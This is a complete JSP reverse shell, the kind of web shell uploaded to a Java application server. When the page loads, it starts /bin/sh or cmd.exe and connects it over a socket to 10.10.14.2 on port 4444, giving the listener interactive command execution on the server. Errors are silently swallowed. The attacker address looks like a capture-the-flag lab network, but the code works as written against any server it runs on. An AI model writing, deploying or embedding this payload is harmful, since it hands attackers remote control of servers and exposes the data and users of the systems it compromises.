<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream xa;
    OutputStream vc;

    StreamConnector( InputStream xa, OutputStream vc )
    {
      this.xa = xa;
      this.vc = vc;
    }

    public void run()
    {
      BufferedReader lo  = null;
      BufferedWriter rst = null;
      try
      {
        lo  = new BufferedReader( new InputStreamReader( this.xa ) );
        rst = new BufferedWriter( new OutputStreamWriter( this.vc ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = lo.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rst.write( buffer, 0, length );
          rst.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( lo != null )
          lo.close();
        if( rst != null )
          rst.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.2", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
